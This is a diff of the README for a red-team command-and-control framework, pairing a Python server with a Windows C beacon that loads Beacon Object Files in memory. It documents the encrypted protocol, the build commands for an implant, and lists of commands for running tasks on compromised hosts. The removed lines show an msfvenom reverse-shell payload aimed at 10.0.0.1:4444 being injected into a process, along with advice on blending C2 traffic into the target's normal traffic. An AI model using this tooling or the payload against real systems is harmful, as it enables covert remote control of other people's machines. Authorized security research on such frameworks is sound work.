@@ -1,211 +1,153 @@
-# C&C — Command & Control Framework
+# Command & Control Framework
 
-A lightweight, custom C2 framework built for educational and authorized red-team use. Consists of a Python-based server and a Windows beacon agent written in C, with support for Beacon Object Files (BOFs) executed in-process.
+A lightweight, C2 framework that consists of a Python-based server with an interactive CLI and a Windows beacon agent written in C, communicating over an encrypted custom binary protocol with support for in-process Beacon Object File (BOF) execution.
+
+> **For authorized use only.** This framework is intended for controlled lab environments, security research, and authorized penetration testing engagements.
 
 ---
 
-## How It Works
+---
 
-**Communication** is HTTP over port `8080`. All traffic is encrypted with **ChaCha20-Poly1305 AEAD** using a per-session 32-byte key derived via ECDH. The agent performs a secure key exchange on `/register`, then encrypts all later traffic with the negotiated session key.
+## Features
 
-**Agent lifecycle:**
+### Encrypted Custom Binary Protocol
 
-1. Beacon registers (`POST /register`) — server issues a UUID agent ID.
-2. Beacon polls (`POST /checkin/<id>`) on a jittered sleep (default 5s ± 3s), sending any buffered output and receiving the next command.
-3. Commands are either shell strings (run via `cmd.exe /c`) or `BOF:<name>:<hex-args>` directives.
-4. For BOF commands, the beacon fetches the `.obj` from `GET /getbof/<id>/<name>`, then loads and executes it in-process via `COFFLoader`.
+All agent traffic uses a custom binary wire format. The 24-byte plaintext header enables server-side routing without decryption; everything after the header is AES-256-GCM encrypted.
 
-**BOFs** (Beacon Object Files) are position-independent COFF objects that run inside the beacon's process without spawning a new process. They use a Cobalt Strike–compatible API shim (`beacon_compatibility.c`) for portability.
+```
+Offset  Size  Field
+──────  ────  ──────────────────────────────────────────────
+  0      4    length      (bytes after this field, big-endian)
+  4      4    magic       (0xDEADBEEF — wire format guard)
+  8      2    version     (protocol version)
+ 10      2    flags       (ENCRYPTED | BATCH | ERROR | FRAGMENT)
+ 12      4    agent_id    (djb2 hash of agent UUID for routing)
+ 16      4    command     (PKG_CMD_* identifier)
+ 20      4    request_id  (ties task → result for correlation)
+ 24    ...    payload     (AES-256-GCM encrypted when flagged)
+```
+
+Command IDs are organized by range: `0x0001–0x00FF` lifecycle, `0x0100–0x01FF` tasking, `0x0400–0x04FF` BOF/loaders. The batch flag allows multiple sub-packages to be coalesced into a single checkin request.
+
+### ECDH-P256 Key Exchange
+
+On first contact the beacon generates an ephemeral ECDH-P256 keypair, sends the uncompressed public key (65 bytes, X9.62 format) to `/register`, and receives the server's public key in return. Both sides independently derive the session key:
+
+```
+session_key = SHA-256(ECDH shared secret X-coordinate)
+```
+
+BCrypt's `BCRYPT_KDF_RAW_SECRET` returns the X-coordinate in little-endian; the agent reverses it to big-endian before hashing so both sides produce identical keys. Each registration produces a fresh ephemeral key — no session key is ever reused.
+
+### Semi-Custom COFFLoader
+
+The COFFLoader (`agent/src/loader/COFFLoader.c`) is a hardened, extended COFF object loader that resolves symbols, applies x86-64 relocations, and executes BOF `go()` entry points in-process. Key design decisions beyond a basic loader:
+
+- **Private heap isolation** — BOF allocations use a dedicated `HeapCreate(HEAP_NO_SERIALIZE)` heap separate from the beacon's own allocator. Corruption in a BOF does not corrupt the beacon heap, and cleanup is a single `HeapDestroy` call.
+- **Critical section protection** — a per-loader `CRITICAL_SECTION` with a 4000-spin-count makes the loader safe to call from multiple threads without external synchronization.
+- **SEH handler registration** — `__C_specific_handler` (x64) is resolved directly from the linker (not via `GetProcAddress`, which cannot find compiler-internal symbols) and registered so BOFs with structured exception handling work correctly.
+- **Guard page detection** — page boundary alignment and read guards catch overruns in relocation processing before they silently corrupt memory.
+- **Execution timeout** — configurable `COFF_DEFAULT_TIMEOUT_MS` kills runaway BOFs without hanging the beacon loop.
+- **Idempotent init** — `CoffLoaderInit()` uses `InterlockedCompareExchange` for lock-free, thread-safe one-time initialization; safe to call repeatedly.
+
+### Cobalt Strike–Compatible BOF Runtime
+
+`beacon_compatibility.c/h` provides the BOF API shim that Cobalt Strike BOFs expect, extended beyond the baseline to support the full TrustedSec BOF catalog:
+
+- `KERNEL32$` / `KERNEL32$` (both mixed-case and all-caps aliases)
+- `ADVAPI32$` — registry, token, security descriptor APIs
+- `SECUR32$` — `GetUserNameExA` and related extended identity APIs
+- `IPHLPAPI$` — `GetIpNetTable`, `GetTcpTable2`, and ARP/routing APIs
+- `WS2_32$` — `inet_ntoa`, `inet_addr`, `WSAStartup`, and socket APIs
+- `NTDLL$` — `RtlMoveMemory` and other NT-native functions
+- Full `BeaconPrintf`, `BeaconOutput`, `BeaconDataParse`, `BeaconDataExtract` implementations with internal output buffering
+
+BOFs built against the standard TrustedSec base headers compile and run without modification.
+
+### Structured Tasking Pipeline
+
+Tasks flow through a typed queue rather than raw command strings:
+
+1. Operator issues `shell <cmd>` or `bof <name> [args]` at the server CLI
+2. Server packages the task (including the BOF `.obj` binary for BOF tasks) into a pending queue
+3. On the next beacon checkin, pending tasks are batched into a single encrypted response package
+4. Beacon dispatches by command ID; BOF tasks are passed directly to the COFFLoader with pre-packed argument buffers
+5. Output is captured into a thread-safe buffer and returned in the following checkin as a `PKG_CMD_TASK_OUTPUT` package, correlated back to the original task via `request_id`
+
+### Persistent Agent State
+
+Agent sessions (session key, task history, output, statistics) are serialized to `agents.json` on the server and reloaded on restart. An operator can kill and restart the server without losing active sessions, provided the beacon reconnects within its registration retry window.
+
+### Jittered Sleep
+
+The beacon's checkin interval uses configurable base sleep plus symmetric jitter: `sleep_ms = BASE_MS + rand() % (JITTER_MS * 2) - JITTER_MS`, clamped to a 1-second floor. Compile-time defaults are 5000ms base, 3000ms jitter.
 
 ---
 
 ## Requirements
 
 ### Server
-- Python 3.x
-- Flask (`pip install flask`)
+- Python 3.8+
+- `pip install flask cryptography`
 
 ### Agent (build)
-- Windows host or Linux with MinGW-w64
+- Windows host or Linux with MinGW-w64 cross-compiler
 - `x86_64-w64-mingw32-gcc` on PATH
 
 ---
 
 ## Building
 
-From the `agent/` directory, run the build script:
+From the `agent/` directory:
 
 ```bat
+build.bat [IP] [PORT] [USER_AGENT] [AUTH_TOKEN] [SLEEP_MS] [JITTER_MS] [USE_HTTPS] [output.exe]
+```
+
+All arguments are optional and default to the values in `config.h`. Examples:
+
+```bat
+:: Default build (127.0.0.1:8080, no auth, 5s sleep)
 build.bat
+
+:: Production build targeting a remote server
+build.bat 10.0.0.1 443 "Mozilla/5.0" MyToken123 10000 5000 0 implant.exe
+
+:: HTTPS build
+build.bat 10.0.0.1 443 "Mozilla/5.0" MyToken123 10000 5000 1 beacon_https.exe
 ```
 
-This will:
-1. Compile `beacon.c`, `beacon_compatibility.c`, and `COFFLoader.c`
-2. Compile all BOFs in `bofs/*.c`
-3. Link `beacon.exe`
-4. Copy compiled `.obj` BOFs to `server/bofs/`
-
-**Output:**
-- `agent/build/beacon.exe` — the agent binary
+Build output:
+- `agent/build/beacon.exe` — agent binary
 - `agent/build/bofs/*.obj` — compiled BOF modules
-- `server/bofs/*.obj` — BOFs ready to serve
+- `server/bofs/*.obj` — BOFs deployed and ready to serve
 
-### Configuration
-
-The agent uses compile-time configuration in `agent/include/config.h`, but the default values can also be sourced from the active C2 profile (`server/profiles/default.json`). The profile now controls the agent connection settings and HTTPS flag used during builds.
-
-```c
-#define C2_SERVER_IP      "127.0.0.1"
-#define C2_SERVER_PORT    8080
-#define C2_USER_AGENT     "Mozilla/5.0"
-#define C2_SLEEP_BASE_MS  5000
-#define C2_SLEEP_JITTER_MS 3000
-#define C2_AUTH_TOKEN     ""
-#define C2_USE_HTTPS      0
-```
-
-To build the agent from the active profile, run:
-
-```bat
-cd agent
-build.bat ..\server\profiles\default.json
-```
-
-You can still override individual values with optional arguments after the profile path:
-
-```bat
-build.bat ..\server\profiles\default.json 10.0.0.1 8080 "Mozilla/5.0" MyToken123 5000 3000 1
-```
-
-Where the final `1` enables HTTPS for the built agent.
-
-For example:
-
-```bat
-build.bat 10.0.0.1 8080 "Mozilla/5.0" MyToken123 5000 3000
-```
-
-If `C2_AUTH_TOKEN` is set, the beacon sends `X-C2-Token` with `/register` and the server validates it before registering a new agent.
+The build script compiles each source independently, then links against `ws2_32`, `bcrypt`, `winhttp`, `iphlpapi`, `secur32`, and `advapi32`. Strip (`-Wl,-s`) and dead-code elimination (`-Wl,--gc-sections`) are applied by default.
 
 ---
 
-## Running the Server
+## Running
+
+### Server
 
 ```bash
 cd server
 python c2server.py
 ```
 
-The server starts Flask on `0.0.0.0:8080`, loads the active C2 profile (`profiles/default.json`), restores any previously saved agent state from `agents.json`, and drops into an interactive CLI:
+
+The server starts on `0.0.0.0:8080`, restores any previously saved agent state, and opens an interactive CLI:
 
 ```
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   C2 SERVER
-  Profile: Default C2 Profile
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
  12:00:00  OK    listening    0.0.0.0:8080
  12:00:00  OK    bof dir      /path/to/server/bofs
  12:00:00  OK    upload dir   /path/to/server/uploads
- 12:00:00  OK    restored    <n> agent(s) from agents.json
 
  >
-```
-
-If you want the server to require agent registration authentication, set the `C2_AUTH_TOKEN` environment variable before running:
-
-```bat
-set C2_AUTH_TOKEN=MyToken123
-python c2server.py
-```
-
----
-
-## C2 Profiles
-
-C2 profiles control communication behavior without code recompilation. The default profile is in `server/profiles/default.json`.
-
-### Profile Structure
-
-```json
-{
-  "profile": {
-    "name": "Default C2 Profile",
-    "beacon": {
-      "register_path": "/register",
-      "checkin_path": "/checkin",
-      "getbof_path": "/getbof"
-    },
-    "http": {
-      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-      "headers": { "Content-Type": "application/octet-stream" },
-      "auth_header": "X-C2-Token"
-    },
-    "sleep": {
-      "base_ms": 5000,
-      "jitter_ms": 3000,
-      "randomize": true,
-      "max_sleep_ms": 60000
-    }
-  }
-}
-```
-
-### Creating Custom Profiles
-
-Copy `profiles/default.json` to a new file (e.g., `profiles/stealth.json`) and modify values. The server loads `profiles/default.json` by default. To use a custom profile, update the `PROFILE_FILE` variable in `c2server.py`.
-
-Key customization options:
-
-- **user_agent**: Change to match target environment (corporate proxy logs, browser versions)
-- **headers**: Add/remove HTTP headers to match legitimate traffic
-- **auth_header**: Rename the authentication header (default: `X-C2-Token`)
-- **connection**: Configure server IP, port, HTTPS usage, and registration auth token
-- **sleep**: Customize beacon check-in intervals and jitter
-
----
-
-## Project Structure
-
-### Agent (`agent/`)
-
-- **`src/beacon.c`** — Main beacon agent with HTTP/ECDH/ChaCha20-Poly1305 implementation
-- **`src/beacon_compatibility.c`** — Cobalt Strike BOF compatibility layer (data parsing, output handling)
-- **`src/COFFLoader.c`** — COFF object loader and relocation handler
-- **`include/config.h`** — Compile-time configuration (server IP, port, auth token, sleep intervals)
-- **`include/beacon.h`** — Beacon API definitions
-- **`bofs/*.c`** — Beacon Object Files (whoami, pslist, dirlist, sysinfo, tcp_connections, inject)
-- **`build.bat`** — Build script (supports `-D` overrides for config values)
-
-### Server (`server/`)
-
-- **`c2server.py`** — Flask HTTP server, agent management, command dispatch
-- **`profile_loader.py`** — C2 profile loader (malleable configuration system)
-- **`profiles/default.json`** — Default communication profile (customizable)
-- **`bofs/`** — Directory for compiled BOF modules (served to agents)
-- **`uploads/`** — Directory for file uploads from agents
-- **`agents.json`** — Persistent agent state (auto-saved on shutdown)
-
-### Communication Flow
-
-```
-Beacon                          Server
-─────────────────────────────────────────
-POST /register (plaintext ECDH pubkey)
-         ──────────────────────>
-                       <─────── (ECDH pubkey + UUID)
-      [Derive shared key via ECDH]
-      [Derive ChaCha20-Poly1305 key via SHA-256(shared_secret)]
-         
-POST /checkin/<uuid> (encrypted)
-    [ChaCha20-Poly1305: nonce || ciphertext || tag]
-         ──────────────────────>
-             [Decrypt, process, queue command]
-                       <─────── (encrypted response)
-
-POST /getbof/<uuid>/<name> (encrypted BOF request)
-         ──────────────────────>
-                       <─────── (encrypted BOF data)
 ```
 
 ---
@@ -214,86 +156,93 @@ POST /getbof/<uuid>/<name> (encrypted BOF request)
 
 ### Global Commands
 
-| Command       | Description                        |
-|---------------|------------------------------------|
-| `list`        | List all registered agents         |
-| `bofs`        | List available BOF modules         |
-| `profile`     | Show active C2 profile details     |
-| `use <id>`    | Select an agent (partial ID OK)    |
-| `clear`       | Clear the terminal                 |
-| `help`        | Show command reference             |
-| `exit`        | Shut down the server               |
+| Command       | Description                           |
+|---------------|---------------------------------------|
+| `list`        | List all registered agents            |
+| `bofs`        | List available BOF modules            |
+| `use <id>`    | Select an agent (partial UUID OK)     |
+| `clear`       | Clear the terminal                    |
+| `help`        | Show command reference                |
+| `exit`        | Shut down the server                  |
 
 ### Agent Commands (after `use <id>`)
 
-| Command            | Description                              |
-|--------------------|------------------------------------------|
-| `shell <cmd>`      | Execute a shell command on the agent     |
-| `bof <name> [args]`| Execute a BOF module with optional args  |
-| `output [n]`       | Show last N command outputs (default 10) |
-| `info`             | Show agent details                       |
-| `stats`            | Show session statistics                  |
-| `back`             | Deselect the current agent               |
+| Command              | Description                                    |
+|----------------------|------------------------------------------------|
+| `shell <cmd>`        | Execute a shell command via `cmd.exe /c`       |
+| `bof <name> [args]`  | Execute a BOF module with optional typed args  |
+| `output [n]`         | Show last N command outputs (default 10)       |
+| `info`               | Show agent details and session key             |
+| `stats`              | Show bytes sent/received, task counts          |
+| `kill`               | Send `PKG_CMD_EXIT` — beacon calls ExitProcess |
+| `back`               | Deselect the current agent                     |
 
-### BOF Argument Types
+### BOF Argument Syntax
 
-Arguments to `bof` are space-separated and type-prefixed:
+Arguments to `bof` are space-separated with an optional type prefix. Unprefixed tokens are treated as UTF-8 strings.
 
-| Prefix | Type              | Example          |
-|--------|-------------------|------------------|
-| `s:`   | UTF-8 string      | `s:C:\Windows`   |
-| `w:`   | UTF-16LE string   | `w:Administrator`|
-| `i:`   | 32-bit integer    | `i:1337`         |
-| `h:`   | 16-bit short      | `h:80`           |
-| *(none)*| String (default) | `hostname`       |
+| Prefix   | Type           | Example                  |
+|----------|----------------|--------------------------|
+| `s:`     | UTF-8 string   | `s:C:\Windows\System32`  |
+| `w:`     | UTF-16LE string| `w:Administrator`        |
+| `i:`     | 32-bit integer | `i:1337`                 |
+| `h:`     | 16-bit short   | `h:443`                  |
+| *(none)* | UTF-8 string   | `hostname`               |
+
+Arguments are packed by the server using the BeaconPack format before being embedded in the task package. The beacon passes the packed buffer directly to the BOF's `go(char *args, int len)` entry point.
 
 ---
 
 ## Included BOF Modules
 
-| Module            | Description                                      |
-|-------------------|--------------------------------------------------|
-| `whoami`          | Current user, domain, SID, elevation, and integrity level |
-| `pslist`          | Running process list (PID, PPID, threads, name)  |
-| `arp_cache`       | ARP table entries                                |
-| `dirlist`         | Directory listing                                |
-| `sysinfo`         | System and OS information                        |
-| `tcp_connections` | Active TCP connections                           |
-| `inject`          | Process injection (allocate memory, write shellcode, execute via CreateRemoteThread) |
+| Module            | Description                                                            |
+|-------------------|------------------------------------------------------------------------|
+| `whoami`          | Current user, domain, SID, privilege level, token elevation type       |
+| `pslist`          | Running process list — PID, PPID, thread count, image name             |
+| `sysinfo`         | OS version, hostname, domain, uptime, architecture                     |
+| `arp_cache`       | ARP table entries via `GetIpNetTable`                                  |
+| `tcp_connections` | Active TCP connections and states via `GetTcpTable2`                   |
+| `dirlist`         | Directory listing with file sizes and attributes                       |
 
-### Process Injection
+### Writing Your Own BOFs
 
-The `inject` BOF allows injecting shellcode into a target process without spawning a child:
+BOFs are standard COFF objects compiled with `gcc -c`. They must export a `go(char *args, int len)` function and use the `BeaconData*` API to parse arguments and `BeaconPrintf` / `BeaconOutput` to produce output. Place the compiled `.obj` in `server/bofs/` and it is immediately available via the `bof` command.
 
+```c
+#include "base.h"
+
+void go(char *args, int len) {
+    if (!bofstart()) return;
+
+    datap parser;
+    BeaconDataParse(&parser, args, len);
+    char *target = BeaconDataExtract(&parser, NULL);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "Target: %s\n", target);
+
+    bofstop();
+}
 ```
- > use abc123
- > bof inject i:<target_pid> s:<shellcode_hex>
-```
 
-Example: Inject into PID 1234 with msfvenom shellcode
 
-```
-$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f hex
-... (generates hex shellcode)
-
- > bof inject i:1234 s:4883ec28...
- [+] Shellcode injected into PID 1234
-```
-
-### Example Usage
-
-```
- > use abc123
- > shell whoami
- > shell dir C:\Users
- > bof pslist
- > bof whoami
- > bof dirlist s:C:\Users\Administrator\Documents
- > bof inject i:1234 s:4883ec28...
- > output 5
- > stats
- > back
-```
 
 ---
 
+## Credits and Prior Art
+
+This project builds on foundational work from several open-source security research projects. The following projects were referenced, adapted, or directly influenced the design:
+
+**[TrustedSec](https://github.com/trustedsec)**
+The COFFLoader implementation and BOF ecosystem are heavily inspired by TrustedSec's open-source tooling. The `beacon_compatibility` shim's KERNEL32$, ADVAPI32$, NTDLL$, and related thunk definitions draw directly from their BOF development headers. The included BOF modules follow the TrustedSec BOF authoring conventions. `inject.c` is attributed to Connor McGarr (@33y0re).
+
+**[Havoc C2](https://github.com/HavocFramework/Havoc)**
+The wire protocol framing, command ID namespace conventions, and the batch-package architecture were influenced by Havoc's agent-server communication design. The `PKG_FLAG_BATCH` pattern for coalescing multiple task results into a single checkin is modeled after Havoc's packet batching approach.
+
+**[SHAD0W](https://github.com/bats3c/shad0w)**
+The overall project structure — a C beacon communicating with a Python C2 server over an encrypted channel with a Cobalt Strike–compatible BOF runtime — was inspired by bats3c's SHAD0W framework. The approach of deriving a per-session symmetric key from an ECDH handshake and using it for all subsequent traffic follows SHAD0W's key establishment model.
+
+---
+
+## License
+
+For research and authorized use only. See `LICENSE` for terms.
